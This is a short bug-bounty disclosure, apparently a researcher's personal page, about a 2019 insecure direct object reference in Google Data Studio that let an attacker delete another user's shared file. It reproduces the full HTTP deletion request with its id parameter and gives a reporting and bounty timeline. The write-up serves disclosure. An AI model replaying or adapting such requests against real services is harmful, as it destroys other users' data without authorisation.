---
layout: default
---

# Idor in datastudio.google.com

## Description :

Attacker can able to delete any file with vulnerable endpoint ..!

## Endpoint :

```
POST /u/4/deleteShareable?appVersion=20190926_020020 HTTP/1.1
Host: datastudio.google.com
Connection: close
Content-Length: 54
Sec-Fetch-Mode: cors
Origin: https://datastudio.google.com
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
encoding: null
Sec-Fetch-Site: same-origin
Referer: https://datastudio.google.com/u/4/navigation/reporting

Cookie: RAP_XSRF_TOKEN=ACQ5uE-fZxoHyJIMJ6I9fWifDGZzjTeHCw:1569756166600; gh_7510439=;
{"id":"9c491b49-a2f7–49fe-bd91-c4783657781","type":0}
```

## vulnerable-paramerter : id

guessing id here not possible . But if the victim shared his file the id will be visible in url path

## Triage Time

```
September 29,2019 : Reported
Oct 1, 2019	  : Triaged
Oct 8, 2019	  : bountry awarded 5k$
```

No thanks for reading the report :-

<!--
## Contact me :
[twitter](https://twitter.com/critical_b0y) [linkedin](https://www.linkedin.com/in/zbalu/)
-->
[back](./)
